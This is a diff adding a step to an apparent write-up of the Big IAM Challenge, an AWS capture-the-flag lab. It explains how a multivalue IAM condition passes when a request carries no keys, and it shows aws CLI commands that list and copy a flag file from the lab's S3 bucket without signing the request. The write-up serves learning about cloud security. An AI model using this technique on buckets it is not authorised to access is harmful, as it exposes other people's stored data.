@@ -334,6 +334,23 @@ y8RLfKzv+Xssnqh1jkGX4xgAuVcdvS9nBGTO76TxQekZj7o71KQo=</HostId></Error>
 Rats.
 Worth a shot though.
 
+> It also returns true if there are no keys in the request,
+> or if the key values resolve to a null data set, such as an empty string.
+
+So how do we make a request with either an empty string or without the tag?
+
+```bash
+$ aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
+
+2023-06-07 19:15:43         42 REDACTED.txt
+2023-06-08 19:20:01      81889 logo-admin.png
+
+$ aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/REDACTED.txt -
+REDACTED
+```
+
+(- ________ - #)
+
 ### References
 
 - [Multivalue policy conditions](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html)
